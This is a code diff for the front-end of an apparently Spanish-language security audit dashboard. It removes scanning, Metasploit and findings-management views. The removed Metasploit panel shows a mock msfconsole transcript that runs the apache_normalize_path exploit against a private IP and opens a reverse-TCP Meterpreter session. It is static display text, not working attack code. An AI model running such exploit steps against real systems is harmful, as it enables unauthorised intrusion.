@@ -3,7 +3,6 @@ import {
   ShieldAlert, 
   Database, 
   Radar, 
-  ScanLine, 
   Cpu, 
   History,
   Play,
@@ -11,7 +10,6 @@ import {
   AlertTriangle,
   Info,
   Clock,
-  ShieldCheck,
   Server,
   Network,
   FileText,
@@ -25,7 +23,6 @@ import {
   Zap,
   Target,
   Terminal,
-  ListFilter,
   LogOut,
   QrCode,
   UserCheck,
@@ -34,7 +31,6 @@ import {
   X,
   Users
 } from 'lucide-react';
-import FindingsManagementView from './components/findings/FindingsManagementView';
 import LoginForm from './components/auth/LoginForm';
 import LandingPage from './components/landing/LandingPage';
 import AdminPanel from './components/admin/AdminPanel';
@@ -588,9 +584,6 @@ export default function App() {
           <nav className="space-y-0.5">
             <NavItem icon={<Radar />} label="Dashboard" active={activeTab === 'Dashboard'} onClick={() => selectTab('Dashboard')} />
             <NavItem icon={<Network />} label="Reconocimiento" active={activeTab === 'Reconocimiento (Nmap)'} onClick={() => selectTab('Reconocimiento (Nmap)')} />
-            <NavItem icon={<ScanLine />} label="Escaneo" active={activeTab === 'Escaneo (Nuclei/SQLMap)'} onClick={() => selectTab('Escaneo (Nuclei/SQLMap)')} />
-            <NavItem icon={<ShieldCheck />} label="Validación" active={activeTab === 'Validación (Metasploit)'} onClick={() => selectTab('Validación (Metasploit)')} />
-            <NavItem icon={<ListFilter />} label="Gestión de Hallazgos" active={activeTab === 'Gestión de Hallazgos'} onClick={() => selectTab('Gestión de Hallazgos')} />
             <NavItem icon={<Cpu />} label="Motor IA" badge="Chat" active={activeTab === 'Motor Ollama IA'} onClick={() => selectTab('Motor Ollama IA')} />
             <NavItem icon={<History />} label="Historial" active={activeTab === 'Historial de Trabajos'} onClick={() => selectTab('Historial de Trabajos')} />
             {isSuperAdmin && (
@@ -1144,11 +1137,6 @@ export default function App() {
             {activeTab === 'Reconocimiento (Nmap)' && (
               <ReconView targetUrl={targetUrl} assets={discoveryAssets} isAuditing={isAuditing} />
             )}
-            {activeTab === 'Escaneo (Nuclei/SQLMap)' && (
-              <ScanView targetUrl={targetUrl} findings={findings} isAuditing={isAuditing} reportStatus={reportStatus} />
-            )}
-            {activeTab === 'Validación (Metasploit)' && <MetasploitView targetUrl={targetUrl} />}
-            {activeTab === 'Gestión de Hallazgos' && <FindingsManagementView />}
             {activeTab === 'Motor Ollama IA' && <OllamaView findings={findings} targetUrl={targetUrl} />}
             {activeTab === 'Historial de Trabajos' && <HistoryView />}
             {activeTab === 'Administración' && isSuperAdmin && <AdminPanel />}
@@ -1360,125 +1348,6 @@ const ReconView = ({
     </div>
   );
 };
-
-const ScanView = ({
-  targetUrl,
-  findings,
-  isAuditing,
-  reportStatus,
-}: {
-  targetUrl: string;
-  findings: FindingRow[];
-  isAuditing: boolean;
-  reportStatus: string;
-}) => {
-  const bySeverity: Record<Severity, number> = {
-    'Crítico': 0, 'Alto': 0, 'Medio': 0, 'Bajo': 0, 'Info': 0, 'Desconocido': 0,
-  };
-  findings.forEach((f) => { bySeverity[f.severity] += 1; });
-
-  const severityCards: { label: Severity; color: string }[] = [
-    { label: 'Crítico', color: 'text-red-400' },
-    { label: 'Alto', color: 'text-orange-400' },
-    { label: 'Medio', color: 'text-[var(--ax-accent)]' },
-    { label: 'Bajo', color: 'text-sky-400' },
-  ];
-
-  return (
-    <div className="grid grid-cols-1 gap-6 animate-in fade-in duration-300">
-      <div className="bg-[#1E293B] border border-slate-700 rounded-xl p-6 shadow-lg">
-        <div className="flex flex-wrap gap-4 justify-between items-end mb-6">
-          <div>
-            <h3 className="text-white font-bold text-lg flex items-center gap-2 mb-1"><ScanLine className="w-5 h-5 text-[var(--ax-accent)]" /> Resultados de Escaneo (Nuclei)</h3>
-            <p className="text-slate-400 text-sm break-all">Plantillas de vulnerabilidad web, CVEs y misconfigurations sobre {targetUrl}.</p>
-          </div>
-          <div className="text-right">
-            <p className="text-3xl font-black text-white">{findings.length}</p>
-            <p className="text-xs text-[var(--ax-accent)] font-bold uppercase tracking-widest">
-              {isAuditing ? 'En Curso' : reportStatus}
-            </p>
-          </div>
-        </div>
-
-        {isAuditing && (
-          <div className="w-full bg-[var(--ax-surface-2)] h-2 mb-6 overflow-hidden border border-[var(--ax-border)] rounded">
-            <div className="bg-[var(--ax-brand)] h-full w-2/3" />
-          </div>
-        )}
-
-        <div className="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-4 gap-4">
-          {severityCards.map((card) => (
-            <div key={card.label} className="bg-slate-800/50 p-4 rounded-lg border border-slate-700/50">
-              <p className="text-xs text-slate-500 uppercase font-bold mb-1">{card.label}</p>
-              <p className={`text-xl font-mono ${card.color}`}>{bySeverity[card.label]}</p>
-            </div>
-          ))}
-        </div>
-
-        {findings.length === 0 && !isAuditing && (
-          <p className="text-slate-500 text-sm mt-6 text-center py-6">
-            Aún no hay resultados de Nuclei en esta sesión — ejecuta "Iniciar Auditoría Automatizada".
-          </p>
-        )}
-      </div>
-    </div>
-  );
-};
-
-const MetasploitView = ({ targetUrl }: { targetUrl: string }) => (
-  <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 lg:h-[500px] animate-in fade-in duration-300">
-    <div className="lg:col-span-1 flex flex-col gap-6">
-      <div className="bg-[#1E293B] border border-slate-700 rounded-xl p-6 shadow-lg flex-1">
-        <h3 className="text-white font-bold flex items-center gap-2 mb-4"><ShieldCheck className="w-5 h-5 text-[var(--ax-brand)]" /> Sesiones Activas</h3>
-        
-        <div className="bg-[var(--ax-info)]/10 border border-[rgba(142,160,184,0.25)] rounded-lg p-4 mb-4">
-          <div className="flex justify-between items-start mb-2">
-            <span className="text-xs text-[var(--ax-info)] font-bold uppercase tracking-widest">Meterpreter 1</span>
-            <span className="w-2 h-2 bg-[var(--ax-info)] rounded-full animate-pulse"></span>
-          </div>
-          <p className="text-white text-sm font-mono mb-1">192.168.1.105:4444</p>
-          <p className="text-slate-400 text-xs">UID: www-data (33) | OS: Linux</p>
-        </div>
-
-        <div className="bg-slate-800/50 border border-slate-700/50 rounded-lg p-4 opacity-50">
-          <div className="flex justify-between items-start mb-2">
-            <span className="text-xs text-slate-500 font-bold uppercase tracking-widest">Shell 2 (Muerta)</span>
-            <span className="w-2 h-2 bg-red-500 rounded-full"></span>
-          </div>
-          <p className="text-slate-400 text-sm font-mono mb-1">192.168.1.105:4445</p>
-          <p className="text-slate-500 text-xs">Conexión cerrada por el host.</p>
-        </div>
-      </div>
-    </div>
-    
-    <div className="lg:col-span-2 bg-[#000000] border border-slate-700 rounded-xl shadow-2xl flex flex-col overflow-hidden relative min-h-[320px]">
-      <div className="bg-[#1E293B] px-4 py-2 border-b border-slate-700 flex items-center gap-2 min-w-0">
-        <Terminal className="w-4 h-4 text-slate-400 shrink-0" />
-        <span className="text-xs font-mono text-slate-300 truncate">msfconsole - {targetUrl}</span>
-      </div>
-      <div className="p-4 font-mono text-[13px] text-slate-300 leading-relaxed overflow-x-auto overflow-y-auto flex-1">
-        <div className="text-slate-400 mb-4">
-          <pre className="text-[var(--ax-brand)] font-bold">
-{`       =[ metasploit v6.3.20-dev                          ]
-+ -- --=[ 2320 exploits - 1214 auxiliary - 413 post       ]
-+ -- --=[ 964 payloads - 45 encoders - 11 nops            ]`}
-          </pre>
-        </div>
-        <div className="mb-2"><span className="text-blue-400">msf6</span> <span className="text-red-400">exploit</span>(multi/http/apache_normalize_path) {'>'} set RHOSTS 192.168.1.105</div>
-        <div className="mb-2 text-slate-400">RHOSTS ={'>'} 192.168.1.105</div>
-        <div className="mb-2"><span className="text-blue-400">msf6</span> <span className="text-red-400">exploit</span>(multi/http/apache_normalize_path) {'>'} exploit</div>
-        <div className="mb-1 text-slate-400">[*] Started reverse TCP handler on 192.168.1.50:4444</div>
-        <div className="mb-1 text-slate-400">[*] Running automatic check ("set AutoCheck false" to disable)</div>
-        <div className="mb-1 text-[var(--ax-info)]">[+] The target is vulnerable.</div>
-        <div className="mb-1 text-slate-400">[*] Executing payload...</div>
-        <div className="mb-1 text-[var(--ax-info)]">[*] Meterpreter session 1 opened (192.168.1.50:4444 -{'>'} 192.168.1.105:39842) at 2026-06-06 14:04:12</div>
-        <div className="mt-4 flex items-center gap-2">
-          <span className="text-blue-400 border-b border-blue-400">meterpreter</span> {'>'} <span className="w-2 h-4 bg-slate-300 animate-pulse"></span>
-        </div>
-      </div>
-    </div>
-  </div>
-);
 
 interface ChatMessage {
   role: 'user' | 'assistant';
